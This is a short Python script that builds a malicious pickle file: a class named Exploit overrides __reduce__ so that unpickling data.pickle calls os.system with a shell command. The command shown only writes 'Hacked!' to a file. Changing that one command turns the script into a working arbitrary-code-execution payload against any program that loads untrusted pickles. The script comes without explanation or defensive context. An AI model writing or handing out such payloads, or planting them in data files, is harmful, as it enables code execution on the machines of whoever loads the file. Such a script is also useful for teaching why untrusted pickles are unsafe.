```python
import pickle
import os

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('echo "Hacked!" > hacked.txt',))

def serialize_exploit():
    with open('data.pickle', 'wb') as f:
        pickle.dump(Exploit(), f)

if __name__ == '__main__':
    serialize_exploit()
```